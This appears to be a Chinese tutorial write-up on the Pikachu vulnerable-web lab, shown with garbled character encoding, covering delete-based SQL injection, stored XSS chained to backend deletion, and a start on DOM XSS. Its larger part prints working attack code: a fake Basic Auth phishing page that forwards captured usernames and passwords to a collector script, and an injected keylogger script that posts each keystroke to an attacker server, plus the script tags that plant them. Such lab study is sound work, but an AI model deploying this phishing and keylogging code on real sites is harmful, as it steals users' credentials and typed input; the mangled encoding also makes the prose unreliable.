ä½ ç”šè‡³å¯ä»¥è®¿é—®ï¼š

```plain
xss_stored.php?id=1 or 1=1
```

æ‰§è¡Œçš„ SQL å®é™…æ˜¯ï¼š

```plain
delete from message where id=1 or 1=1
```





#### å›åˆ°æ­£é¢˜ï¼Œå’‹ä»¬å…ˆæŠŠè·³è½¬ç½‘é¡µåˆ äº†å§ (Tï¼¿T)
**ç›´æ¥æ¸…ç©º message è¡¨**

å…³é”® sql æ¼æ´ï¼š

```plain
$query="delete from message where id={$_GET['id']}";
```

**æ²¡æœ‰ä»»ä½•è¿‡æ»¤**ï¼Œè€Œä¸”ä½œè€…éƒ½å†™æ˜äº†æ˜¯å½©è›‹



è¿™æ¡ xss çš„ id æ˜¯å¤šå°‘å‘¢ï¼Ÿ

æˆ‘ä»¬å…ˆè¯•ä¸€ä¸‹ id=1

æ‰§è¡Œçš„ SQL æ˜¯ï¼š

```plain
delete from message where id=1
```



ä»è¿”å›çš„æ•°æ®åŒ…å¯ä»¥æ‰¾åˆ°ï¼Œè¿™æ¡ç•™è¨€çš„ id æ˜¯ 71

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636213.png)



æ‰§è¡Œï¼š`GET /vul/xss/xss_stored.php?id=71 HTTP/1.1`

ç»ˆäºåˆ äº†

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635977.png)<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628766.png)



### å°ç»“ï¼š
åœ¨è¯¥é¡µé¢ä¸­ï¼Œç•™è¨€å†…å®¹åœ¨è¾“å‡ºæ—¶æœªè¿›è¡Œ HTML è½¬ä¹‰ï¼Œå¯¼è‡´**å­˜å‚¨å‹ XSS æ¼æ´**ã€‚åŒæ—¶ï¼Œåˆ é™¤åŠŸèƒ½ä¸­å¯¹ GET å‚æ•° id çš„å¤„ç†ä¸å½“ï¼Œ**å­˜åœ¨ SQL æ³¨å…¥æ¼æ´**ã€‚æ”»å‡»è€…å¯åˆ©ç”¨ delete æ³¨å…¥ç›´æ¥åˆ é™¤æ•°æ®åº“ä¸­çš„æ¶æ„ XSS è®°å½•ï¼Œä»è€Œæ¢å¤é¡µé¢åŠŸèƒ½ï¼Œè¯¥é¡µé¢ä½“ç°äº†**å¤šç§ Web æ¼æ´çš„å åŠ ä¸è”åŠ¨é£é™©**ã€‚  



###  XSS â†’ SQL è”åŠ¨  
æœ‰äº†ä¸Šè¿°ç»å†ï¼Œæˆ‘ä»¬ç ”ç©¶ä¸€ä¸‹ ç”¨å­˜å‚¨å‹ XSS è‡ªåŠ¨è§¦å‘ delete æ³¨å…¥ï¼ˆXSS â†’ SQLï¼‰  



è¦åšçš„ **XSS â†’ SQL è”åŠ¨**ï¼Œæœ¬è´¨æ˜¯ï¼š

```plain
å­˜å‚¨å‹ XSSï¼ˆæµè§ˆå™¨æ‰§è¡Œï¼‰
        â†“
è‡ªåŠ¨æ„é€  HTTP è¯·æ±‚
        â†“
å‘½ä¸­æœåŠ¡ç«¯ SQL æ¼æ´æ¥å£
        â†“
è§¦å‘æ•°æ®åº“æ“ä½œ
```

**å‰ç«¯æ¼æ´ï¼ˆXSSï¼‰ â†’ é©±åŠ¨åç«¯æ¼æ´ï¼ˆSQL æ³¨å…¥ / å±é™© SQLï¼‰**

è¿™åœ¨çœŸå®ä¸–ç•Œé‡Œå«ï¼š**æ¼æ´é“¾ï¼ˆExploit Chainï¼‰**





åˆ©ç”¨ï¼š XSS â†’ è‡ªåŠ¨è°ƒç”¨ delete æ¥å£ï¼ˆåˆæ³•å‚æ•°ï¼‰



é€»è¾‘æ˜¯ï¼š

+ XSS åœ¨ å—å®³è€…æµè§ˆå™¨ ä¸­æ‰§è¡Œ
+ JS è‡ªåŠ¨å‘è¯·æ±‚ï¼š

```plain
/xss_stored.php?id=71
```

+ æœåŠ¡ç«¯æ‰§è¡Œï¼š

```plain
delete from message where id=71;
```

****

è¿™ä¸æ˜¯ SQL æ³¨å…¥  
è¿™æ˜¯ XSS é©±åŠ¨åç«¯æ•æ„Ÿæ“ä½œ

****

**æ”»å‡»è€…æ— éœ€ç›´æ¥åˆ©ç”¨ SQL æ³¨å…¥ï¼Œåªéœ€é€šè¿‡å­˜å‚¨å‹ XSS å³å¯åœ¨å—å®³è€…ä¸Šä¸‹æ–‡ä¸­è§¦å‘æœåŠ¡ç«¯çš„å±é™© SQL æ“ä½œï¼Œé€ æˆæ•°æ®è¢«æ¶æ„åˆ é™¤ï¼Œä½“ç°äº†å‰ç«¯æ¼æ´ä¸åç«¯é€»è¾‘ç¼ºé™·çš„è”åŠ¨é£é™©ã€‚**

**  **

å› ä¸ºç°å®ä¸–ç•Œé‡Œï¼š

+ **å¾ˆå¤šç³»ç»Ÿ ****æ²¡æœ‰ SQL æ³¨å…¥**
+ **ä½†æœ‰ï¼š**
    - âŒ** è¶Šæƒ delete**
    - âŒ** æ—  CSRF æ ¡éªŒ**
    - âŒ** XSS**

ğŸ‘‰** ****XSS + é€»è¾‘ç¼ºé™· = å®é™…ç ´å**

**è¿™æ¯”å•ç‚¹ SQL æ³¨å…¥å±é™©å¾—å¤šã€‚**



## å­˜å‚¨å‹ XSS æ”»å‡»åˆ©ç”¨ï¼ˆç½‘ç«™é’“é±¼ï¼‰




æˆ‘ä»¬åˆ©ç”¨ xfish ä¸­çš„æ–‡ä»¶ï¼Œæ¥æ¼”ç¤ºç½‘ç«™é’“é±¼

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630200.png)



### è¯´æ˜æ–‡ä»¶ï¼š


####  pkxss_fish_result.php â€”â€”åå°ç®¡ç†é¡µé¢
+ ç™»å½•æ ¡éªŒ
+ å±•ç¤º fish è¡¨
+ æ”¯æŒ GET åˆ é™¤æ•°æ®

```php
<?php
error_reporting(0);
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();


// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®
if(!check_login($link)){
    header("location:../pkxss_login.php");
}


if(isset($_GET['id']) && is_numeric($_GET['id'])){
    $id=escape($link, $_GET['id']);
    $query="delete from fish where id=$id";
    execute($link, $query);
}
?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>é’“é±¼ç»“æœ</title>
<link rel="stylesheet" type="text/css" href="../antxss.css" />
</head>
<body>
<div id="title">
<h1>pikachu Xss é’“é±¼ç»“æœ</h1>
<a href="../xssmanager.php">è¿”å›é¦–é¡µ</a>
</div>
<div id="result">
    <table class="tb" border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
        <tr>
            <td class="1">id</td>
            <td class="1">time</td>
            <td class="1">username</td>
            <td class="1">password</td>
            <td class="2">referer</td>
            <td class="2">æ“ä½œ</td>
        </tr>
    <?php 
    $query="select * from fish";
    $result=mysqli_query($link, $query);
    while($data=mysqli_fetch_assoc($result)){
$html=<<<A
    <tr>
        <td class="1">{$data['id']}</td>
        <td class="1">{$data['time']}</td>
        <td class="1">{$data['username']}</td>
        <td class="1">{$data['password']}</td>
        <td class="2">{$data['referer']}</td>
         <td><a href="pkxss_fish_result.php?id={$data['id']}">åˆ é™¤</a></td>
    </tr>
A;
         
        echo $html; 
    }
    ?>
    </table>
</div>
</body>
</html>
```



####  xfish.php â€”â€”ä¿¡æ¯æ”¶é›†å™¨
`insert fish(time,username,password,referer)`

æ¥æ”¶ GET å‚æ•°ï¼ŒåŸæ ·å†™å…¥æ•°æ®åº“

```php
<?php
error_reporting(0);
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();



if(!empty($_GET['username']) && !empty($_GET['password'])){

    $username=$_GET['username'];
    $password=$_GET['password'];
    $referer="";
    $referer.=$_SERVER['HTTP_REFERER'];
    $time=date('Y-m-d g:i:s');
    $query="insert fish(time,username,password,referer) 
    values('$time','$username','$password','$referer')";
    $result=mysqli_query($link, $query);
}

?>
```



#### fish.php æ˜¯é’“é±¼å…¥å£ï¼ˆè¯±é¥µï¼‰
æ ¸å¿ƒåŠŸèƒ½ï¼š

`header("WWW-Authenticate: Basic realm='è®¤è¯'");`

`header('HTTP/1.0 401 Unauthorized');`

æµè§ˆå™¨è¯†åˆ«åè‡ªåŠ¨å¼¹å‡ºç™»å½•æ¡†ï¼Œæé†’ç”¨æˆ·è¾“å…¥ç”¨æˆ·åã€å¯†ç 

```php
<?php
error_reporting(0);
// var_dump($_SERVER);
if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
//å‘é€è®¤è¯æ¡†ï¼Œå¹¶ç»™å‡ºè¿·æƒ‘æ€§çš„info
    header('Content-type:text/html;charset=utf-8');
    header("WWW-Authenticate: Basic realm='è®¤è¯'");
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization Required.';
    exit;
} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
//å°†ç»“æœå‘é€ç»™æœé›†ä¿¡æ¯çš„åå°,è¯·å°†è¿™é‡Œçš„IPåœ°å€ä¿®æ”¹ä¸ºç®¡ç†åå°çš„IP
    header("Location: http://pikachu:8765/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}
    &password={$_SERVER[PHP_AUTH_PW]}");
}

?>
```





### æ¼æ´å¤ç°ï¼š


åˆ¶é€ ä¸€ä¸ª XSS æ³¨å…¥ç‚¹ï¼Œè¿™é‡Œå°±ä»¥å­˜å‚¨å‹ XSS ä¸ºä¾‹ä½¿ç”¨ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636915.png)



æ”»å‡»è€…å†™å…¥æ¶æ„ XSS ä»£ç ï¼š

```javascript
<script>
location.href="http://pikachu:8765/pkxss/xfish/fish.php";
</script>
```

+ ä¸€æ—¦ XSS è¢«è§¦å‘
+ æµè§ˆå™¨**è‡ªåŠ¨è·³è½¬åˆ°é’“é±¼é¡µé¢**
+ å—å®³è€…çœ‹åˆ°çš„æ˜¯ã€Œç³»ç»Ÿè®¤è¯æ¡†ã€

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636555.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635442.png)



ä¹‹åçš„å—å®³è€…è®¿é—® å­˜å‚¨å‹ XSS çš„é¡µé¢æ—¶ï¼Œå°±ä¼šç›´æ¥è·³è½¬åˆ° `[http://pikachu:8765/pkxss/xfish/fish.php](http://pikachu:8765/pkxss/xfish/fish.php)`æç¤ºå—å®³è€…è¿›è¡Œç™»å½•

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625534.png)



è¿™æ—¶ç”¨æˆ·è¯¯ä»¥ä¸ºæ˜¯ç³»ç»Ÿ / ç®¡ç†åå° æé†’ç™»å½•ï¼Œ

æ‰€ä»¥è¯¥ç”¨æˆ·å†™å…¥äº†è´¦å·å’Œå¯†ç 

username: admin

password: 123456



#### è¸©å‘è®°å½•ï¼š
å½“æˆ‘ä»¬è¾“å…¥è´¦å·å’Œå¯†ç åï¼Œå‘ç°åå°å¹¶æ²¡æœ‰æ”¶åˆ°ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬çš„æ¯ä¸€æ­¥æ“ä½œéƒ½æ˜¯æ­£ç¡®ï¼Œ



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624714.png)



é‚£ä¹ˆé—®é¢˜å‡ºç°åœ¨æ­å»ºçš„**æœåŠ¡å™¨**ä¸Š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629906.png)

æˆ‘è¿™é‡Œç”¨çš„ç¯å¢ƒæ˜¯ï¼š

+ Windows
+ Apache
+ **PHP FastCGIï¼ˆmod_fcgidï¼‰**

**1. åœ¨ Apache + FastCGI æ¨¡å¼ä¸‹ï¼ŒPHP é»˜è®¤ä¸ä¼šè§£æ HTTP Authorization å¤´**  
æ‰€ä»¥è¿™ä¸¤ä¸ªå˜é‡æ˜¯ç©ºçš„ï¼š

```php
$_SERVER['PHP_AUTH_USER']
$_SERVER['PHP_AUTH_PW']
```

ä½†æ˜¯ Windows + å°çš® + Apacheï¼ŒåŸºæœ¬ä¸Š**ã€Œæ²¡æœ‰çœŸæ­£çš„ mod_phpã€  **ï¼Œ

çœŸæ­£å†³å®šè¡Œä¸ºçš„æ˜¯ï¼š`Server API`

| Server API | ç»“æœ |
| --- | --- |
| Apache 2.0 Handlerï¼ˆmod_phpï¼‰ | âœ… è‡ªåŠ¨ç”Ÿæˆ PHP_AUTH_* |
| CGI / FastCGI / FPM | âŒ ä¸ç”Ÿæˆ |


****

**2. Apache åœ¨ FastCGI æ¨¡å¼ä¸‹ï¼Œé»˜è®¤ä¼šâ€œåƒæ‰â€ Authorization å¤´  **

ä¹Ÿå°±æ˜¯è¯´ï¼š

+ æµè§ˆå™¨ â†’ Apacheï¼šâœ”ï¸
+ Apache â†’ PHPï¼šâŒï¼ˆå¤´è¢«æ‹¦æˆªï¼‰

PHP é‡Œè¿ `HTTP_AUTHORIZATION` éƒ½ä¸å­˜åœ¨ã€‚





æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¢ä¸€ä¸ªç¯å¢ƒï¼šDockerï¼Œæˆ–è€…ç›´æ¥æ‰‹åŠ¨è§£æ Authorization å¤´

 æœ€ç»ˆå¯ç”¨ç‰ˆ `fish.php`

```php
<?php
error_reporting(0);

// 1. å°è¯•è·å– Authorization å¤´ï¼ˆå…¼å®¹å„ç§ç¯å¢ƒï¼‰
$auth = '';

if (isset($_SERVER['HTTP_AUTHORIZATION'])) {
    $auth = $_SERVER['HTTP_AUTHORIZATION'];
} elseif (function_exists('getallheaders')) {
    $headers = getallheaders();
    if (isset($headers['Authorization'])) {
        $auth = $headers['Authorization'];
    }
}

// 2. å¦‚æœæ²¡æœ‰è®¤è¯ä¿¡æ¯ï¼Œå¼¹å‡º Basic Auth ç™»å½•æ¡†
if (!$auth) {
    header('Content-type:text/html;charset=utf-8');
    header("WWW-Authenticate: Basic realm='è®¤è¯'");
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization Required.';
    exit;
}

// 3. è§£æ Basic Auth
if (stripos($auth, 'basic ') === 0) {
    $decoded = base64_decode(substr($auth, 6));
    list($username, $password) = explode(':', $decoded, 2);

    // 4. è·³è½¬åˆ°ä¿¡æ¯æ”¶é›†åå°
    header("Location: http://pikachu:8765/pkxss/xfish/xfish.php?username={$username}&password={$password}");
    exit;
}

```



å¹¶ä¸”éœ€è¦ä¿®æ”¹ Apache çš„é…ç½®æ–‡ä»¶ï¼š

ä½œç”¨ï¼š

æŠŠ Apache æ¥æ”¶åˆ°çš„ `Authorization`  
	æ˜ å°„ä¸º PHP å¯è®¿é—®çš„ `$_SERVER['HTTP_AUTHORIZATION']`

```plain
RewriteEngine On
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
```

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621586.png)

å…¨éƒ¨ä¿®æ”¹å®Œæˆåï¼Œé‡å¯å°çš®é¢æ¿



å†æ¬¡å°è¯•ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616133.png)



å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸè§£æäº†  Authorization å¤´  

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631325.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617335.png)



#### å°ç»“ï¼š
 åœ¨ Apache + FastCGI ç¯å¢ƒä¸­ï¼ŒHTTP `Authorization` å¤´é»˜è®¤ä¸ä¼šä¼ é€’ç»™ PHPï¼Œå¯¼è‡´ PHP æ— æ³•è·å– `PHP_AUTH_USER` ç­‰è®¤è¯å˜é‡ã€‚éœ€é€šè¿‡ Apache æ˜¾å¼é…ç½®è½¬å‘è¯·æ±‚å¤´ï¼Œæˆ–åœ¨åº”ç”¨å±‚ç›´æ¥è§£æ `Authorization`ï¼Œå¦åˆ™åŸºäº HTTP Basic Auth çš„è®¤è¯æˆ–é’“é±¼é€»è¾‘å°†å…¨éƒ¨å¤±æ•ˆã€‚  







## å­˜å‚¨å‹ XSS æ”»å‡»åˆ©ç”¨ï¼ˆ<font style="color:rgb(0, 0, 0);">é”®ç›˜è®°å½•</font>ï¼‰
é€šè¿‡ XSS æ³¨å…¥ä¸€æ®µ JSï¼Œç›‘å¬é¡µé¢é”®ç›˜è¾“å…¥ï¼ŒæŠŠç”¨æˆ·æ•²çš„æ¯ä¸€ä¸ªå­—ç¬¦å®æ—¶é€šè¿‡ Ajax å‘åˆ°æ”»å‡»è€…æœåŠ¡å™¨ï¼Œåç«¯ç›´æ¥å…¥åº“ï¼Œç®¡ç†å‘˜åå°å¯æŸ¥çœ‹å’Œåˆ é™¤ã€‚  

### æ–‡ä»¶è¯´æ˜ï¼š
#### pkxss_keypress_result.php åå°æŸ¥çœ‹é¡µé¢  


```php
<?php
// error_reporting(0);
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();

// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®
if(!check_login($link)){
    header("location:../pkxss_login.php");
}


if(isset($_GET['id']) && is_numeric($_GET['id'])){
    $id=escape($link, $_GET['id']);
    $query="delete from keypress where id=$id";
    execute($link, $query);
}
?>


<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>é”®ç›˜è®°å½•ç»“æœ</title>
<link rel="stylesheet" type="text/css" href="../antxss.css" />
</head>
<body>
<div id="title">
<h1>pikachu Xss è·å–é”®ç›˜è®°å½•ç»“æœ</h1>
<a href="../xssmanager.php">è¿”å›é¦–é¡µ</a>
</div>
<div id="xss_main">
<table border="1px" cellpadding="10" cellspacing="1" bgcolor="#5f9ea0">
    <tr>
        <td>id</td>
        <td>è®°å½•</td>
        <td>æ“ä½œ</td>
    </tr>
    <?php 
    $query="select * from keypress";
    $result=mysqli_query($link, $query);
    while($data=mysqli_fetch_assoc($result)){
$html=<<<A
    <tr>
        <td>{$data['id']}</td>
        <td>{$data['data']}</td>
        <td><a href="pkxss_keypress_result.php?id={$data['id']}">åˆ é™¤</a></td>
    </tr>
A;
         
        echo $html;
        
        
    }
    
    ?>
    
</table>
</div>
</body>
</html>
```



#### rk.jsï¼ˆæ”»å‡»æ ¸å¿ƒï¼‰
`document.onkeypress = onkeypress;` ç›‘å¬é”®ç›˜

 åªè¦ç”¨æˆ·åœ¨é¡µé¢ä¸Šæ‰“å­—ï¼ˆè´¦å·ã€å¯†ç ã€èŠå¤©å†…å®¹ã€æœç´¢æ¡†ï¼‰ï¼Œéƒ½ä¼šè¢«æ•è·ã€‚  



`ajax.open("POST", "[http://pikachu:8765/pkxss/rkeypress/rkserver.php",true);](http://192.168.1.15/pkxss/rkeypress/rkserver.php",true);)`

å°†æ•°æ®å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨





```javascript
/**
* Created by runner on 2018/7/8.
*/

function createAjax(){
  var request=false;
  if(window.XMLHttpRequest){
    request=new XMLHttpRequest();
    if(request.overrideMimeType){
      request.overrideMimeType("text/xml");
    }

  }else if(window.ActiveXObject){

    var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
    for(var i=0; i<versions.length; i++){
      try{
        request=new ActiveXObject(versions[i]);
        if(request){
          return request;
        }
      }catch(e){
        request=false;
      }
    }
  }
  return request;
}

var ajax=null;
var xl="datax=";

function onkeypress() {
  var realkey = String.fromCharCode(event.keyCode);
  xl+=realkey;
  show();
}

document.onkeypress = onkeypress;

function show() {
  ajax = createAjax();
  ajax.onreadystatechange = function () {
    if (ajax.readyState == 4) {
      if (ajax.status == 200) {
        var data = ajax.responseText;
      } else {
        alert("é¡µé¢è¯·æ±‚å¤±è´¥");
      }
    }
  }

  var postdate = xl;
  ajax.open("POST", "http://192.168.1.15/pkxss/rkeypress/rkserver.php",true);
  ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  ajax.setRequestHeader("Content-length", postdate.length);
  ajax.setRequestHeader("Connection", "close");
  ajax.send(postdate);
}
```





#### rkserver.php  åç«¯æ¥æ”¶  
```php
<?php
  /**
 * Created by runner.han
 * There is nothing new under the sun
 */

  include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();

//è®¾ç½®å…è®¸è¢«è·¨åŸŸè®¿é—®
header("Access-Control-Allow-Origin:*");

$data = $_POST['datax'];
$query = "insert keypress(data) values('$data')";
$result=mysqli_query($link,$query);


?>
```



### æ¼æ´å¤ç°ï¼š


æ³¨å…¥  rk.js  

```javascript
<script src="http://pikachu:8765/pkxss/rkeypress/rk.js"></script>
```



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630400.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621246.png)





æ¥ä¸‹æ¥çš„å—å®³è€…è®¿é—®è¯¥é¡µé¢ï¼Œè¿›è¡Œç•™è¨€ï¼š

å—å®³è€…å¼€å§‹æ‰“å­—ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622752.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629739.png)



## 2.4 DOMå‹xss
### æ¼æ´åŸç†ï¼š
**DOM å‹ XSS æ˜¯ä¸€ç§å®Œå…¨å‘ç”Ÿåœ¨æµè§ˆå™¨ç«¯çš„ XSS æ¼æ´ã€‚**

æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„è„šæœ¬çš„æ•°æ®ï¼Œå‰ç«¯ JavaScript ä» URLã€Hashã€Cookie ç­‰ä½ç½®è¯»å–æ•°æ®ï¼Œå¹¶ç›´æ¥å†™å…¥ DOMï¼ˆå¦‚ `innerHTML`ã€`document.write`ï¼‰ï¼Œå¯¼è‡´æµè§ˆå™¨æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚


**æœåŠ¡å™¨æœ¬èº«å¯èƒ½æ˜¯â€œå®‰å…¨çš„â€ï¼Œæ¼æ´å‡ºç°åœ¨å‰ç«¯ JSã€‚**



### å…ˆææ˜ç™½ä»€ä¹ˆæ˜¯ DOMï¼š
[https://www.w3school.com.cn/js/js_htmldom.asp](https://www.w3school.com.cn/js/js_htmldom.asp)

> ## JavaScript HTML DOM
> ### ä»€ä¹ˆæ˜¯ DOMï¼Ÿ
> + DOMï¼ˆDocument Object Modelï¼‰ï¼šæµè§ˆå™¨åœ¨åŠ è½½ç½‘é¡µæ—¶åˆ›å»ºçš„é¡µé¢å¯¹è±¡æ¨¡å‹
> + æ˜¯ W3C æ ‡å‡†ï¼Œä¸å¹³å°å’Œè¯­è¨€æ— å…³
> + ç”¨äºè®¿é—®å’Œæ“ä½œç½‘é¡µå†…å®¹
>
> 
>
> **<font style="color:rgb(51, 51, 51);">DOMé‡Œé¢ä¼šæŠŠæˆ‘ä»¬çš„HTMLåˆ†æˆä¸€ä¸ªDOMæ ‘:</font>**
>
> <!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634131.png)
>
> ### **HTML DOM æ˜¯ä»€ä¹ˆï¼Ÿ**
> + HTML çš„æ ‡å‡†å¯¹è±¡æ¨¡å‹å’Œç¼–ç¨‹æ¥å£
> + æŠŠ HTML é¡µé¢ä¸­çš„å…ƒç´ ã€å±æ€§ã€æ ·å¼ã€äº‹ä»¶éƒ½å½“ä½œå¯¹è±¡æ¥æ“ä½œ
>
> ### **JavaScript èƒ½é€šè¿‡ DOM åšä»€ä¹ˆï¼Ÿ**
> JavaScript å¯ä»¥ï¼š
>
> + âœ… è®¿é—® / ä¿®æ”¹ HTML å…ƒç´ 
> + âœ… ä¿®æ”¹ HTML å±æ€§
> + âœ… ä¿®æ”¹ CSS æ ·å¼
> + âœ… æ·»åŠ  / åˆ é™¤ HTML å…ƒç´ 
> + âœ… æ·»åŠ  / å“åº”äº‹ä»¶
>
> ### **DOM æ ‡å‡†åˆ†ç±»**
> + Core DOMï¼šæ‰€æœ‰æ–‡æ¡£çš„é€šç”¨æ¨¡å‹
> + XML DOMï¼šXML æ–‡æ¡£æ¨¡å‹
> + HTML DOMï¼šHTML æ–‡æ¡£æ¨¡å‹ï¼ˆæœ€å¸¸ç”¨ï¼‰
>
> 
>
> **ğŸ‘‰**** HTML DOM = ç”¨ JavaScript æ“ä½œç½‘é¡µçš„ä¸€æ•´å¥—æ ‡å‡†è§„åˆ™**
>



### æ­£æ–‡
<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621209.png)



ç‚¹å‡»åå‡ºç°ï¼š<font style="color:rgb(51, 122, 183);">what do you see?</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615530.png)



é‚£ä¹ˆå°è¯•è¾“å…¥ï¼š1

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635696.png)



ç‚¹å‡» <font style="color:rgb(51, 122, 183);">what do you see?</font>

+ **â€œNot Foundâ€**ï¼šä½ è®¿é—®çš„ URL `/vul/xss/1` åœ¨æœåŠ¡å™¨ä¸Šä¸å­˜åœ¨ï¼ŒæœåŠ¡å™¨æ‰¾ä¸åˆ°å¯¹åº”çš„èµ„æºã€‚
+ **â€œAdditionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the requestâ€**ï¼šæœåŠ¡å™¨æœ¬æƒ³æ˜¾ç¤ºä¸€ä¸ªè‡ªå®šä¹‰çš„ 404 é”™è¯¯é¡µé¢ï¼ˆErrorDocumentï¼‰ï¼Œä½†æ˜¯è¿™ä¸ªè‡ªå®šä¹‰é¡µé¢æœ¬èº«ä¹Ÿä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®ï¼Œæ‰€ä»¥åˆæŠ¥äº†ç¬¬äºŒä¸ª 404ã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616234.png)



å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬çš„è¾“å…¥éƒ½å˜æˆäº†ä¸€ä¸ªç½‘é¡µæ ‡ç­¾ï¼Œ



è¯•ä¸€è¯•å¼¹çª—ï¼š

```javascript
<script>alert('dom')</script>
```



